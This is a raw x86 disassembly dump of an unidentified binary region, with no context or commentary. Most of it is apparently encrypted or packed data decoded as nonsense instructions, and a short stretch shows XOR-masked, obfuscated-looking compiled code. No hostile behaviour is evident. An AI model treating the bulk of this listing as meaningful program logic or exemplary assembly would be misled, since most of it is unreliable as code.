  417cc7:	jmp    0x417c6d
  417cc9:	xchg   esi,eax
  417cca:	(bad)  
  417ccb:	xor    eax,0x9c1c4650
  417cd0:	dec    esp
  417cd1:	jne    0x417cc6
  417cd3:	ror    BYTE PTR [eax+0x56],cl
  417cd6:	imul   edx,DWORD PTR [ecx+0x430125ec],0x1c319a1a
  417ce0:	sub    eax,0x1f501379
  417ce5:	fwait
  417ce6:	jmp    0x9420:0x9600e4e5
  417ced:	push   ebp
  417cee:	fdiv   QWORD PTR [esp+edx*1]
  417cf1:	push   ecx
  417cf2:	jo     0x417cea
  417cf4:	aaa    
  417cf5:	das    
  417cf6:	dec    esi
  417cf7:	mov    BYTE PTR [esi-0x2dfc9c42],ah
  417cfd:	jmp    0x417d35
  417cff:	xchg   DWORD PTR [ecx+0x7],esi
  417d02:	add    BYTE PTR [edx-0x3c],0xc8
  417d06:	or     DWORD PTR [ebp-0x64],esp
  417d09:	dec    edi
  417d0a:	push   ecx
  417d0b:	cmc    
  417d0c:	xlat   BYTE PTR ds:[ebx]
  417d0d:	ins    DWORD PTR es:[edi],dx
  417d0e:	mov    ds:0x42ce7d08,eax
  417d13:	dec    edi
  417d14:	in     eax,dx
  417d15:	out    dx,eax
  417d16:	lds    esp,FWORD PTR [edx]
  417d18:	or     al,0x47
  417d1a:	mov    ebx,0xc5a7054c
  417d1f:	sbb    bh,BYTE PTR [edi+0x57b91746]
  417d25:	dec    esp
  417d26:	aam    0x87
  417d28:	shl    ecx,cl
  417d2a:	jnp    0x417cbe
  417d2c:	loop   0x417d92
  417d2e:	ficomp DWORD PTR [eax-0x241603c]
  417d34:	mov    esi,DWORD PTR [edx]
  417d36:	js     0x417d0c
  417d38:	push   ss
  417d39:	or     DWORD PTR [edi+0x37b4e06a],0xffffffb7
  417d40:	mov    dl,0x15
  417d42:	xchg   ebp,eax
  417d43:	ret    0x6ad1
  417d46:	and    BYTE PTR [ecx+0x112ae53d],al
  417d4c:	cdq    
  417d4d:	xchg   edx,eax
  417d4e:	push   ebp
  417d4f:	jmp    0xff037fa0
  417d54:	lahf   
  417d55:	cmp    BYTE PTR [esi+ebx*1],al
  417d58:	cdq    
  417d59:	je     0x417dd0
  417d5b:	add    DWORD PTR [ecx-0x27ea4128],edx
  417d61:	jbe    0x417d20
  417d63:	xchg   esp,eax
  417d64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d65:	lock inc eax
  417d67:	push   ds
  417d68:	push   cs
  417d69:	dec    esi
  417d6a:	test   eax,0xc8a3ed8
  417d6f:	pop    ebp
  417d70:	xchg   edi,eax
  417d71:	aaa    
  417d72:	out    dx,eax
  417d73:	sub    bl,BYTE PTR ds:0x96559c73
  417d79:	shr    ecx,0xa8
  417d7c:	mov    cl,0x10
  417d7e:	jae    0x417d68
  417d80:	outs   dx,BYTE PTR ds:[esi]
  417d81:	sbb    eax,0x466fcca6
  417d86:	or     eax,0x8dea9e40
  417d8b:	bound  esi,QWORD PTR [ecx-0x13]
  417d8e:	adc    al,0x5d
  417d90:	add    al,0x8a
  417d92:	mov    bh,0x36
  417d94:	xchg   ecx,eax
  417d95:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  417d97:	push   ecx
  417d98:	call   0x7f07:0x28535d97
  417d9f:	hlt    
  417da0:	pop    ss
  417da1:	(bad)  
  417da2:	jg     0x417d57
  417da4:	add    al,0xed
  417da6:	outs   dx,BYTE PTR ds:[esi]
  417da7:	lods   eax,DWORD PTR ds:[esi]
  417da8:	stos   DWORD PTR es:[edi],eax
  417da9:	add    al,0xf9
  417dab:	mov    ecx,0x9fb5d748
  417db0:	call   0x9d81:0xd6b7269a
  417db7:	cmp    dl,cl
  417db9:	or     DWORD PTR [edx-0xb],0x28
  417dbd:	neg    BYTE PTR [eax]
  417dbf:	mov    esi,0x484bf84a
  417dc4:	ret    
  417dc5:	mov    ch,0xa1
  417dc7:	mov    eax,ds:0x2c4dce5a
  417dcc:	in     eax,0xad
  417dce:	int3   
  417dcf:	mov    ds:0x40f4ac09,eax
  417dd4:	lea    edi,[bp+di+0x476f]
  417dd9:	je     0x417daf
  417ddb:	in     eax,dx
  417ddc:	xchg   esp,eax
  417ddd:	lahf   
  417dde:	cmp    DWORD PTR [eax-0x152d61d9],esp
  417de4:	cmp    bl,BYTE PTR [ecx-0x54b3ad27]
  417dea:	sub    ch,dl
  417dec:	(bad)  
  417ded:	stos   BYTE PTR es:[edi],al
  417dee:	add    al,0xef
  417df0:	adc    edx,DWORD PTR [ebp-0x38e0aeeb]
  417df6:	dec    ebp
  417df7:	mov    bl,0xc8
  417df9:	sbb    ch,0x4b
  417dfc:	outs   dx,BYTE PTR ds:[esi]
  417dfd:	scas   eax,DWORD PTR es:[edi]
  417dfe:	xor    BYTE PTR [edx-0x29b2ee7c],0x46
  417e05:	(bad)  
  417e07:	out    dx,eax
  417e08:	xchg   ebp,eax
  417e0a:	in     al,0x5c
  417e0c:	in     eax,0x26
  417e0e:	xor    BYTE PTR [eax-0x7b609f17],dl
  417e14:	sub    al,dh
  417e16:	out    0x6,al
  417e18:	dec    edx
  417e19:	clc    
  417e1a:	daa    
  417e1b:	fscale 
  417e1d:	mov    WORD PTR [edi],cs
  417e1f:	xor    bl,dh
  417e21:	das    
  417e22:	loop   0x417e08
  417e24:	aad    0x74
  417e26:	dec    edx
  417e27:	imul   esp,DWORD PTR ds:0x58d37e59,0x3b
  417e2e:	shr    eax,1
  417e30:	retf   0x6d62
  417e33:	lods   eax,DWORD PTR ds:[esi]
  417e34:	or     cl,BYTE PTR [eax+ecx*8+0x6f]
  417e38:	pushf  
  417e39:	jmp    0x880adf02
  417e3e:	jo     0x417e08
  417e40:	test   eax,0x4f804c0c
  417e45:	jmp    0x8a22:0x12cfb4bd
  417e4c:	inc    eax
  417e4d:	sub    esi,ecx
  417e4f:	sub    al,0xf8
  417e51:	push   ebp
  417e52:	jle    0x417e9e
  417e54:	inc    edi
  417e55:	sbb    BYTE PTR [eax-0x1e],ch
  417e58:	xchg   esp,eax
  417e59:	mov    esi,0xff22e885
  417e5e:	xchg   edx,eax
  417e5f:	int    0x37
  417e61:	ja     0x417e04
  417e63:	int    0x7f
  417e65:	dec    ecx
  417e66:	lock xor eax,0xb5ec2628
  417e6c:	jg     0x417e8d
  417e6e:	fcomp  DWORD PTR [edi+0x57bda9ef]
  417e74:	out    dx,eax
  417e75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e76:	jb     0x417e87
  417e78:	mov    ds:0x570a6618,al
  417e7d:	push   ebp
  417e7e:	or     ah,BYTE PTR [ecx]
  417e80:	add    eax,0x67c52ec5
  417e85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e86:	stos   BYTE PTR es:[edi],al
  417e87:	adc    ebx,DWORD PTR [ebp+0x22db6738]
  417e8d:	cli    
  417e8e:	fcmovnb st,st(7)
  417e90:	call   0x260b:0x62a116b6
  417e97:	jl     0x417e8a
  417e99:	(bad)  
  417e9b:	loope  0x417e27
  417e9d:	cli    
  417e9e:	out    dx,al
  417e9f:	cmp    BYTE PTR [ebp-0x750c3b52],dh
  417ea5:	pop    ebx
  417ea6:	jnp    0x417f0a
  417ea8:	cwde   
  417ea9:	loopne 0x417f0a
  417eab:	and    eax,0xab1eea5c
  417eb0:	mov    cl,0xbb
  417eb2:	xor    al,0xb1
  417eb4:	test   al,0x8
  417eb6:	xchg   esi,eax
  417eb7:	jle    0x417eb1
  417eb9:	mov    dl,0x50
  417ebb:	fwait
  417ebc:	pop    esi
  417ebd:	ins    BYTE PTR es:[edi],dx
  417ebe:	ds das 
  417ec0:	cdq    
  417ec1:	cmc    
  417ec2:	and    BYTE PTR [edi+ebp*1+0x1efb5747],0xf
  417eca:	ins    BYTE PTR es:[edi],dx
  417ecb:	mov    ah,0xee
  417ecd:	add    eax,0xfdc6c031
  417ed2:	dec    ecx
  417ed3:	in     eax,dx
  417ed4:	mov    bl,0xbb
  417ed6:	(bad)  
  417ed7:	or     BYTE PTR [esi-0x31],al
  417eda:	xchg   edx,eax
  417edb:	push   ebx
  417edc:	call   0x7de7856e
  417ee1:	(bad)  
  417ee2:	sbb    DWORD PTR [ebp+edi*2+0xad886ca],ebx
  417ee9:	and    eax,0xc8ca1743
  417eee:	scas   al,BYTE PTR es:[edi]
  417eef:	in     eax,0x10
  417ef1:	dec    ebx
  417ef2:	or     eax,0xf5e8b6e1
  417ef7:	jbe    0x417ef4
  417ef9:	add    BYTE PTR [eax-0x34c53724],ah
  417eff:	inc    ebx
  417f00:	adc    eax,0xe4ccbfa7
  417f05:	mov    edi,0xa28b2376
  417f0a:	push   ss
  417f0b:	mov    DWORD PTR [edx],ebx
  417f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f0e:	jno    0x417e9e
  417f10:	adc    ecx,DWORD PTR [esi+0x52c51c44]
  417f16:	les    ebx,FWORD PTR [esi-0x5ce89fc6]
  417f1c:	push   edx
  417f1d:	jne    0x417f81
  417f1f:	ds loope 0x417f38
  417f22:	jns    0x417f80
  417f24:	jno    0x417f34
  417f26:	out    dx,eax
  417f27:	xor    edx,ecx
  417f29:	das    
  417f2a:	nop
  417f2b:	stos   BYTE PTR es:[edi],al
  417f2c:	loope  0x417f7e
  417f2e:	inc    ecx
  417f2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f30:	sub    eax,edi
  417f32:	mov    ds:0x6cef6203,al
  417f37:	and    eax,0xa377db8f
  417f3c:	arpl   dx,cx
  417f3e:	sbb    edi,DWORD PTR [eax]
  417f40:	jecxz  0x417ed8
  417f42:	loop   0x417ed5
  417f44:	inc    ebp
  417f45:	setb   BYTE PTR [eax+0x0]
  417f49:	ja     0x417f5a
  417f4b:	xchg   ebx,ebx
  417f4d:	dec    eax
  417f4e:	lock xor BYTE PTR [ebx-0x3],ch
  417f52:	jecxz  0x417fa3
  417f54:	clc    
  417f55:	jne    0x417f19
  417f57:	xchg   esi,eax
  417f58:	mov    esi,0xef724d5
  417f5d:	xchg   esi,eax
  417f5e:	add    edx,DWORD PTR fs:[esi]
  417f61:	rol    DWORD PTR [eax-0x66],0xf6
  417f65:	movd   mm4,DWORD PTR [ebp-0x27]
  417f69:	dec    edi
  417f6a:	fiadd  WORD PTR [ecx]
  417f6c:	rcr    DWORD PTR [ebx],0xf
  417f6f:	pushf  
  417f70:	out    dx,al
  417f71:	jl     0x417fc8
  417f73:	pop    ss
  417f74:	add    dh,BYTE PTR [edx]
  417f76:	pushf  
  417f77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f78:	add    eax,0x90fd96ba
  417f7d:	pop    ecx
  417f7e:	lds    esi,FWORD PTR [eax]
  417f80:	call   0x9bdfa397
  417f85:	mov    eax,ds:0x553ea4a3
  417f8a:	mov    dh,ch
  417f8c:	xchg   BYTE PTR [esi],dh
  417f8e:	push   esi
  417f8f:	aas    
  417f90:	call   0x500:0x4e559f58
  417f97:	add    al,0x6e
  417f99:	sbb    dl,bl
  417f9b:	nop
  417f9c:	ins    DWORD PTR es:[edi],dx
  417f9d:	into   
  417f9e:	repz gs dec ebx
  417fa1:	jle    0x417f43
  417fa3:	ss scas eax,DWORD PTR es:[edi]
  417fa5:	js     0x417f52
  417fa7:	and    bl,BYTE PTR [ecx-0x5c7c0e70]
  417fad:	jno    0x417f3b
  417faf:	cdq    
  417fb0:	hlt    
  417fb1:	cwde   
  417fb2:	pop    es
  417fb3:	xchg   esp,eax
  417fb4:	ror    BYTE PTR [edx+edi*8-0x3f7a7c90],cl
  417fbb:	push   0x7a
  417fbd:	js     0x417fc2
  417fbf:	mov    dl,0x8e
  417fc1:	jne    0x418018
  417fc3:	and    esp,DWORD PTR [eax-0x718ec151]
  417fc9:	out    dx,al
  417fca:	retf   
  417fcb:	nop
  417fcc:	clc    
  417fcd:	aaa    
  417fce:	jnp    0x417ff3
  417fd0:	mov    edx,0x6c441b98
  417fd5:	jbe    0x417f73
  417fd7:	rcr    DWORD PTR [esi+0x62],0x31
  417fdb:	test   DWORD PTR [edi-0x5f7d14ec],edi
  417fe1:	mov    esp,DWORD PTR [eax-0x1a]
  417fe4:	aas    
  417fe5:	mov    ecx,0xe72869bf
  417fea:	jmp    0xe9971509
  417fef:	push   0xe7836264
  417ff4:	pop    ss
  417ff5:	addr16 fwait
  417ff7:	iret   
  417ff8:	rol    ah,1
  417ffa:	cmp    BYTE PTR [edi],dh
  417ffc:	pusha  
  417ffd:	jns    0x417fbe
  417fff:	dec    esi
  418000:	imul   ecx,DWORD PTR [edi-0x3d],0x76cf961b
  418007:	pop    ss
  418008:	fbstp  TBYTE PTR [ebx-0x12]
  41800b:	pop    ecx
  41800c:	or     BYTE PTR [edi+0x509d7675],0x4a
  418013:	repz jo 0x418012
  418016:	add    al,0xfb
  418018:	jmp    0x7b93:0x83f93d68
  41801f:	jo     0x417ff2
  418021:	das    
  418022:	xchg   esi,eax
  418023:	mov    eax,ds:0x60b81f1b
  418028:	xchg   DWORD PTR [edi+0xa23127e],ebp
  41802e:	sub    BYTE PTR [edx],bl
  418030:	das    
  418031:	icebp  
  418032:	mov    ds:0x9f54f15a,al
  418037:	mov    ds,edx
  418039:	pop    esp
  41803a:	bound  ebx,QWORD PTR [edi-0xca82522]
  418040:	xchg   esp,eax
  418041:	sbb    ah,BYTE PTR [edi+0x56]
  418044:	enter  0xb1f9,0x1e
  418048:	jo     0x41803a
  41804a:	pop    es
  41804b:	loope  0x41804b
  41804d:	cld    
  41804e:	retw   0x7853
  418052:	stc    
  418053:	in     al,0x3b
  418055:	icebp  
  418056:	mov    esp,0xb6f40633
  41805b:	xchg   edx,eax
  41805c:	repnz dec eax
  41805e:	inc    eax
  41805f:	in     al,0x69
  418061:	imul   eax,DWORD PTR cs:0x7a50fdf8,0xffffffbf
  418069:	dec    ecx
  41806a:	loop   0x4180d3
  41806c:	xchg   edi,eax
  41806d:	shl    BYTE PTR [edi+0x76],0xa9
  418071:	sbb    ebp,esi
  418073:	xor    eax,0x221dfc4e
  418078:	push   ecx
  418079:	cmp    esp,DWORD PTR [edi-0xb]
  41807c:	pop    ecx
  41807d:	mov    edx,ebp
  41807f:	and    BYTE PTR [eax-0x15],bl
  418082:	xor    al,0xcb
  418084:	adc    esp,DWORD PTR [ebp+0x72]
  418087:	and    ebx,DWORD PTR [ecx-0x5ca0e9c1]
  41808d:	pop    DWORD PTR [esi]
  41808f:	inc    esp
  418090:	xchg   esp,eax
  418091:	rol    DWORD PTR [eax],0x70
  418094:	popf   
  418095:	push   0xffffff96
  418097:	rcr    DWORD PTR [esi-0x2b],0xce
  41809b:	mov    ds:0xe1ab444c,eax
  4180a0:	cmp    eax,0x2f800ca
  4180a5:	xchg   ecx,eax
  4180a6:	dec    esi
  4180a7:	inc    esp
  4180a8:	sbb    dl,BYTE PTR [ebx+0x5d9a01eb]
  4180ae:	add    eax,0x8701f22c
  4180b3:	js     0x41806e
  4180b5:	test   eax,0xd001b8ef
  4180ba:	out    dx,al
  4180bb:	test   DWORD PTR [eax+0x5ca45661],esp
  4180c1:	and    ebp,0xffffffc2
  4180c4:	mov    eax,ds:0x86d10e6b
  4180c9:	call   0xee6681b9
  4180ce:	mov    edi,0x6427bfa3
  4180d3:	inc    eax
  4180d4:	enter  0xf9ad,0x71
  4180d8:	pop    ebp
  4180d9:	cmp    eax,0x2cdd11cd
  4180de:	cld    
  4180df:	sahf   
  4180e0:	mov    dh,0x53
  4180e2:	push   ebx
  4180e3:	outs   dx,BYTE PTR ds:[esi]
  4180e4:	int3   
  4180e5:	jg     0x4180c3
  4180e7:	shr    DWORD PTR [ecx],0x34
  4180ea:	xchg   esp,eax
  4180eb:	sbb    eax,0xc6db2785
  4180f0:	je     0x418123
  4180f2:	dec    ebp
  4180f3:	adc    BYTE PTR [ebp+esi*2-0x793f3be3],ah
  4180fa:	(bad)  
  4180fb:	into   
  4180fc:	mov    eax,ds:0xa4c87931
  418101:	test   al,0x9e
  418103:	loopne 0x4180b8
  418105:	dec    ebp
  418106:	call   0xa57cccd4
  41810b:	sar    ecx,cl
  41810d:	cmp    dh,cl
  41810f:	fldcw  WORD PTR [esi+0x3d7b46bd]
  418115:	ds dec ebp
  418117:	mov    esp,0xf10427be
  41811c:	pusha  
  41811d:	mov    bl,0xb8
  41811f:	dec    BYTE PTR [ebp-0x4a]
  418122:	addr16 mov al,bh
  418125:	sub    eax,0xe02181ef
  41812a:	mov    esp,0x71dff8a3
  41812f:	adc    DWORD PTR [edi-0x37a7568c],eax
  418135:	mov    ax,ds:0x51723d1e
  41813b:	mov    ch,0x35
  41813d:	enter  0x34f4,0x9e
  418141:	add    eax,0x45dfcbfd
  418146:	xchg   ecx,eax
  418147:	stc    
  418148:	out    dx,al
  418149:	dec    edi
  41814a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41814b:	inc    BYTE PTR [ebp+0x8bad7bc]
  418151:	dec    eax
  418152:	adc    al,0x33
  418154:	ss or  al,0xb9
  418157:	ss jg  0x418129
  41815a:	rcl    DWORD PTR [ebp+0x6f],1
  41815d:	or     eax,0xdba0d2d9
  418162:	ficom  DWORD PTR [ebx+0x1a]
  418165:	fimul  WORD PTR [esp+ecx*4]
  418168:	xor    al,0x6d
  41816a:	mov    ?,WORD PTR [edx-0x11]
  41816d:	fdiv   st(0),st
  41816f:	nop
  418170:	pop    ss
  418171:	dec    edi
  418172:	ret    0xd85d
  418175:	ja     0x41814a
  418177:	jmp    0x418132
  418179:	xchg   ecx,eax
  41817a:	cmp    al,bl
  41817c:	xchg   edi,eax
  41817d:	sub    DWORD PTR [eax],esi
  41817f:	add    al,BYTE PTR [esp-0x1b1c0487]
  418186:	rcl    BYTE PTR [ecx-0x5c],0xc2
  41818a:	inc    ebp
  41818b:	je     0x41814c
  41818d:	push   ebp
  41818e:	lahf   
  41818f:	cmp    edi,esi
  418191:	pop    eax
  418192:	aad    0x7a
  418194:	jp     0x418146
  418196:	and    al,0xca
  418198:	dec    DWORD PTR [edx]
  41819a:	ds test cl,bl
  41819d:	hlt    
  41819e:	pop    ebx
  41819f:	inc    eax
  4181a0:	ds (bad) 
  4181a2:	sbb    al,0x5d
  4181a4:	into   
  4181a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181a6:	loope  0x4181af
  4181a8:	jb     0x41821c
  4181aa:	outs   dx,DWORD PTR ds:[esi]
  4181ab:	sub    eax,0xaf4e0723
  4181b0:	js     0x418179
  4181b2:	scas   eax,DWORD PTR es:[edi]
  4181b3:	pop    DWORD PTR [ebx+edx*2]
  4181b6:	icebp  
  4181b7:	ficomp DWORD PTR [edx+0x618e81e]
  4181bd:	jp     0x418217
  4181bf:	cmp    BYTE PTR [edx+eiz*8-0xb],ah
  4181c3:	fdiv   DWORD PTR [edx+0x67]
  4181c6:	ret    
  4181c7:	gs stos BYTE PTR es:[edi],al
  4181c9:	jmp    0xdc87:0xa6298d28
  4181d0:	mov    al,0x2
  4181d2:	stc    
  4181d3:	xchg   esp,eax
  4181d4:	lds    esi,FWORD PTR [esi]
  4181d6:	jle    0x41823e
  4181d8:	out    0x6f,al
  4181da:	push   0x3e6bce00
  4181df:	scas   al,BYTE PTR es:[edi]
  4181e0:	sbb    DWORD PTR [ebp+0x7358d8fc],esi
  4181e6:	jmp    0x41820f
  4181e8:	cmp    DWORD PTR [eax+0x170ccd4a],edi
  4181ee:	lods   al,BYTE PTR ds:[esi]
  4181ef:	add    al,0x26
  4181f1:	pop    ebp
  4181f2:	and    BYTE PTR [eax+0x66],0x19
  4181f6:	faddp  st(7),st
  4181f8:	out    dx,al
  4181f9:	or     al,BYTE PTR [esi-0x7edfebae]
  4181ff:	cmc    
  418200:	or     ch,BYTE PTR [ecx-0x5897fafe]
  418206:	cld    
  418207:	sti    
  418208:	adc    eax,0x65bc4380
  41820d:	mov    ecx,DWORD PTR [ebp-0x55]
  418210:	jmp    0x41825b
  418212:	rcl    DWORD PTR [eax-0x852cba1],0xb9
  418219:	adc    eax,0x27594a4a
  41821e:	xor    ax,0x4288
  418222:	jmp    0x3bfeecaf
  418227:	aas    
  418228:	ret    
  418229:	and    eax,0x81caa026
  41822e:	add    DWORD PTR [eax-0x10],ebp
  418231:	loope  0x418265
  418233:	dec    edx
  418234:	int3   
  418235:	mov    cl,0x91
  418237:	and    ebx,ebx
  418239:	popf   
  41823a:	sahf   
  41823b:	outs   dx,BYTE PTR ds:[esi]
  41823c:	inc    ecx
  41823d:	pop    es
  41823e:	outs   dx,DWORD PTR ds:[esi]
  41823f:	scas   eax,DWORD PTR es:[edi]
  418240:	fs dec ecx
  418242:	xor    BYTE PTR [edi+eax*8-0x146ded46],ah
  418249:	mov    esi,gs
  41824b:	push   DWORD PTR [edi+esi*2+0x62]
  41824f:	je     0x4181f4
  418251:	xchg   BYTE PTR [edi+0x28f90fd],al
  418257:	retf   
  418258:	jae    0x4182b3
  41825a:	repz jmp 0x9316:0x32296e89
  418262:	xchg   edi,eax
  418263:	cwde   
  418264:	iret   
  418265:	and    eax,ebp
  418267:	scas   eax,DWORD PTR es:[edi]
  418268:	pop    edx
  418269:	pop    ds
  41826a:	cmc    
  41826b:	fcomp  DWORD PTR [ebx]
  41826d:	cld    
  41826e:	retf   
  41826f:	test   edi,ecx
  418271:	icebp  
  418272:	rol    DWORD PTR [ebx+0x749e469],0x82
  418279:	cmp    DWORD PTR [ecx+0x48dd891e],eax
  41827f:	push   ebp
  418280:	pop    eax
  418281:	pop    esi
  418282:	xchg   edx,eax
  418283:	pop    ebx
  418284:	int    0xa7
  418286:	pop    esi
  418287:	sbb    BYTE PTR [eax+0x9315f79],ch
  41828d:	jmp    0xf2b9a2c5
  418292:	lock lods eax,DWORD PTR ds:[esi]
  418294:	push   esi
  418295:	add    ebx,DWORD PTR [edi-0x56]
  418298:	jmp    0x41830f
  41829a:	dec    ecx
  41829b:	in     eax,0x92
  41829d:	stos   BYTE PTR es:[edi],al
  41829e:	pusha  
  41829f:	jge    0x41827c
  4182a1:	sbb    DWORD PTR es:[ecx+0x54],0xe7c13c2d
  4182a9:	es push cs
  4182ab:	lock aaa 
  4182ad:	call   DWORD PTR [edx-0x4]
  4182b0:	jg     0x4182c6
  4182b2:	frstor [esi]
  4182b4:	and    bl,ah
  4182b6:	ins    BYTE PTR es:[edi],dx
  4182b7:	pop    ds
  4182b8:	mov    eax,esi
  4182ba:	xchg   ebp,eax
  4182bb:	pop    es
  4182bc:	sbb    eax,0x939b5cdc
  4182c1:	loopne 0x41825d
  4182c3:	scas   eax,DWORD PTR es:[edi]
  4182c4:	test   al,0xa8
  4182c6:	xor    dh,al
  4182c8:	mov    sp,0xf5aa
  4182cc:	jo     0x4182e5
  4182ce:	stos   DWORD PTR es:[edi],eax
  4182cf:	out    dx,al
  4182d0:	sub    BYTE PTR [esi+eax*8+0x3a],0xcb
  4182d5:	loop   0x4182e6
  4182d7:	cmp    esi,DWORD PTR [edi+0xa1a7bdd]
  4182dd:	cld    
  4182de:	data16 fistp WORD PTR [ecx+0x6f56cfdd]
  4182e5:	shr    BYTE PTR [edi],cl
  4182e7:	cld    
  4182e8:	neg    DWORD PTR [edx-0x46]
  4182eb:	scas   al,BYTE PTR es:[edi]
  4182ec:	xor    al,0x6d
  4182ee:	sahf   
  4182ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182f0:	and    al,0xd9
  4182f2:	and    DWORD PTR [ecx-0x4],0xeb713dc2
  4182f9:	dec    eax
  4182fa:	sub    eax,0x9aa7ee53
  4182ff:	enter  0x80fe,0x1e
  418303:	xchg   esi,eax
  418304:	cmp    ecx,DWORD PTR [esi]
  418306:	xchg   ebp,eax
  418307:	std    
  418308:	mov    dh,0x73
  41830a:	outs   dx,DWORD PTR ds:[esi]
  41830b:	mov    esi,DWORD PTR [eax]
  41830d:	aam    0x27
  41830f:	repz jb 0x418313
  418312:	push   edi
  418313:	mov    edx,0xc0054c02
  418318:	popa   
  418319:	xchg   ebx,eax
  41831a:	mov    ebx,0xf541d45a
  41831f:	inc    esp
  418320:	jle    0x418364
  418322:	fldcw  WORD PTR [ebp+0x11]
  418325:	iret   
  418326:	(bad)  
  418328:	ds inc esi
  41832a:	mov    esp,0x2bca5e25
  41832f:	loope  0x418364
  418331:	mov    ebx,0x6ee69c46
  418336:	cmp    esi,DWORD PTR [esp+edx*1-0x39]
  41833a:	in     al,0x57
  41833c:	test   ah,dh
  41833e:	addr16 push ecx
  418340:	mov    al,0x7d
  418342:	jnp    0x4183c0
  418344:	jl     0x4182ee
  418346:	push   esp
  418347:	lea    esi,[esi]
  418349:	in     al,0x16
  41834b:	(bad)  
  41834c:	push   ebx
  41834d:	mov    ah,0x16
  41834f:	or     esi,edx
  418351:	dec    edx
  418352:	lods   al,BYTE PTR ds:[esi]
  418353:	push   es
  418354:	popf   
  418355:	mov    dh,0x3e
  418357:	stos   DWORD PTR es:[edi],eax
  418358:	pop    es
  418359:	xor    esp,edx
  41835b:	pop    esp
  41835c:	ficomp DWORD PTR [eax+0x68]
  41835f:	ss cdq 
  418361:	aas    
  418362:	jg     0x418336
  418364:	(bad)  
  418366:	pop    esi
  418367:	xchg   DWORD PTR [edx-0x4eae817],edx
  41836d:	mov    ah,0xa3
  41836f:	mov    ds:0x940b1224,al
  418374:	pop    ebx
  418375:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418376:	push   esi
  418377:	add    esp,DWORD PTR [eax]
  418379:	pushf  
  41837a:	lock mov edi,edx
  41837d:	(bad)  
  41837e:	push   ss
  41837f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418380:	std    
  418381:	lds    edx,FWORD PTR [esp+edx*8+0xf6bd4fd]
  418388:	test   ecx,esi
  41838a:	mov    eax,0x558bffff
  41838f:	hlt    
  418390:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418397:	mov    bl,BYTE PTR [ebp-0x1]
  41839a:	cmp    dl,bl
  41839c:	je     0x41a7c3
  4183a2:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183a5:	mov    edx,DWORD PTR [ebp-0xc]
  4183a8:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4183af:	mov    ebx,DWORD PTR [ebp+0xc]
  4183b2:	xor    ecx,eax
  4183b4:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e2]
  4183bb:	jne    0x41cc40
  4183c1:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183c4:	mov    edx,DWORD PTR [ebp+0xc]
  4183c7:	xor    ecx,eax
  4183c9:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e2]
  4183d1:	mov    edx,DWORD PTR [ebp-0x18]
  4183d4:	xor    edx,eax
  4183d6:	add    edx,esi
  4183d8:	cmp    ecx,edx
  4183da:	mov    ecx,DWORD PTR [ebp-0x14]
  4183dd:	mov    DWORD PTR [ebp+0x8],ecx
  4183e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4183e3:	je     0x41cd48
  4183e9:	xor    ecx,eax
  4183eb:	add    ecx,esi
  4183ed:	mov    ecx,0x242ebe9
  4183f2:	je     0x41cb94
  4183f8:	mov    edx,DWORD PTR [ebp+0x8]
  4183fb:	mov    ebx,DWORD PTR [ebp-0x8]
  4183fe:	xor    edx,eax
  418400:	xor    ebx,eax
  418402:	sub    edx,ebx
  418404:	sub    edx,esi
  418406:	xor    edx,eax
  418408:	mov    DWORD PTR [ebp+0x8],edx
  41840b:	mov    edx,DWORD PTR [ebp+0x8]
  41840e:	mov    ebx,DWORD PTR [ebp-0x58]
  418411:	add    edx,0x5708c4
  418417:	imul   edx,ebx
  41841a:	mov    DWORD PTR [ebp-0x58],edx
  41841d:	mov    edx,DWORD PTR [ebp+0x8]
  418420:	mov    ebx,DWORD PTR [ebp-0x54]
  418423:	add    edx,0x64f8da
  418429:	or     edx,ebx
  41842b:	mov    DWORD PTR [ebp-0x54],edx
  41842e:	mov    edx,DWORD PTR [ebp+0x8]
  418431:	mov    ebx,DWORD PTR [ebp-0x50]
  418434:	add    edx,ecx
  418436:	xor    edx,ebx
  418438:	mov    DWORD PTR [ebp-0x50],edx
  41843b:	mov    edx,DWORD PTR [ebp+0x8]
  41843e:	mov    ebx,DWORD PTR [ebp-0x4c]
  418441:	add    edx,edi
  418443:	and    edx,ebx
  418445:	mov    DWORD PTR [ebp-0x4c],edx
  418448:	mov    edx,DWORD PTR [ebp+0x8]
  41844b:	mov    ebx,DWORD PTR [ebp-0x48]
  41844e:	lea    edx,[ebx+edx*1+0x241fc1f]
  418455:	mov    DWORD PTR [ebp-0x48],edx
  418458:	mov    edx,DWORD PTR [ebp+0x8]
  41845b:	mov    ebx,0xfa5e15e2
  418460:	sub    ebx,edx
  418462:	add    ebx,DWORD PTR [ebp-0x44]
  418465:	mov    DWORD PTR [ebp-0x44],ebx
  418468:	mov    edx,DWORD PTR [ebp+0x8]
  41846b:	xor    edx,eax
  41846d:	add    edx,esi
  41846f:	jne    0x4183f8
  418475:	jmp    0x41cb94
  41847a:	jmp    0x41a7c3
  41847f:	adc    BYTE PTR [edi],cl
  418481:	lods   eax,DWORD PTR ds:[esi]
  418482:	fnsave [ebx-0x21]
  418485:	lock jae 0x41841c
  418488:	sbb    DWORD PTR [edx-0x4],ebx
  41848b:	xchg   BYTE PTR [edx+0x6d],ah
  41848e:	addr16 int3 
  418490:	xor    BYTE PTR [ebp+0x7c],bh
  418493:	inc    eax
  418494:	pop    edi
  418495:	jl     0x418513
  418497:	sbb    al,0xa7
  418499:	adc    ecx,DWORD PTR [edx+ebx*2]
  41849c:	or     cl,al
  41849e:	fiadd  WORD PTR [edi+0x231c1fc6]
